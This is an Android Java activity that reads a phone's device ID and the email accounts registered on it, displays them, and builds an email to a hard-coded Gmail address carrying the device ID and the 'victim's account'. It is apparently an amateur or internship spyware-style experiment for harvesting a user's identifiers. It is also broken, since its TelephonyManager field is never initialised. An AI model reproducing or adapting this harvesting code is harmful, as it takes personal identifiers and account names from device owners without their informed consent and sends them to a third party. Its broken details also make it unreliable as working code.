package congthuc.com.a4t;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.v7.app.ActionBarActivity;
import android.telephony.TelephonyManager;
import android.util.Patterns;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

import org.apache.http.protocol.HTTP;

import java.util.ArrayList;
import java.util.regex.Pattern;


public class DoJobs extends ActionBarActivity {
    PackageManager pm;
    TelephonyManager telephonyManager;
    Button send_Data_toServer, btn_send_data_byMail;
    TextView deviceId, userAccount;
    ListView listAccount;
    ArrayList<String> accounts = new ArrayList<String>();
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_do_jobs);
        deviceId = (TextView)findViewById(R.id.txt_device_id);

        listAccount = (ListView)findViewById(R.id.list_account);
        send_Data_toServer = (Button)findViewById(R.id.btn_send_data_toServer);
        btn_send_data_byMail = (Button)findViewById(R.id.btn_send_data_bymail);

        Intent intent = getIntent();
        //final String message = intent.getStringExtra(ThucActivity.EXTRA_MESSAGE_DEVICE_ID);
        final String message = telephonyManager.getDeviceId();
        deviceId.setText(message);

        accounts = getAccount();

        ArrayAdapter<String> adapter = new ArrayAdapter<String>(this,
                android.R.layout.simple_list_item_1, accounts);

        // Assign adapter to ListView
        listAccount.setAdapter(adapter);

        pm = getBaseContext().getPackageManager();
        send_Data_toServer.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent appStartIntent = pm.getLaunchIntentForPackage("com.internship.fois.hellojapan");

                if (null != appStartIntent)
                {
                    startActivity(appStartIntent);
                }
            }
        });

        btn_send_data_byMail.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent emailIntent = new Intent(Intent.ACTION_SEND);
                // The intent does not have a URI, so declare the "text/plain" MIME type
                emailIntent.setType(HTTP.PLAIN_TEXT_TYPE);
                emailIntent.putExtra(Intent.EXTRA_EMAIL, new String[]{"congthucpro@gmail.com"}); // recipients
                emailIntent.putExtra(Intent.EXTRA_SUBJECT, "Email subject: This is the automatic email from android device");
                emailIntent.putExtra(Intent.EXTRA_TEXT, "Email message text: \n Your device's Id: "+ message + ", victim's " +
                        "account: " + accounts.get(0).toString());

                //emailIntent.putExtra(Intent.EXTRA_STREAM, Uri.parse("content://path/to/email/attachment"));
                emailIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                emailIntent.setType("message/rfc822");

                try {
                    startActivity(Intent.createChooser(emailIntent, "Cong Thuc: Send email using..."));
                } catch (android.content.ActivityNotFoundException ex) {
                    Toast.makeText(getBaseContext(), "No email clients installed.", Toast.LENGTH_SHORT).show();
                }
            }
        });
    }

    private ArrayList<String> getAccount(){
        ArrayList<String> possibleEmail = new ArrayList<String>();
        Pattern emailPattern = Patterns.EMAIL_ADDRESS;
        Account[] accounts = AccountManager.get(getBaseContext()).getAccounts();
        for (Account account : accounts) {
            if (emailPattern.matcher(account.name).matches()) {
                if(!possibleEmail.contains(account.name)){
                    possibleEmail.add(account.name);
                }
            }
        }
        return possibleEmail;
    }
}
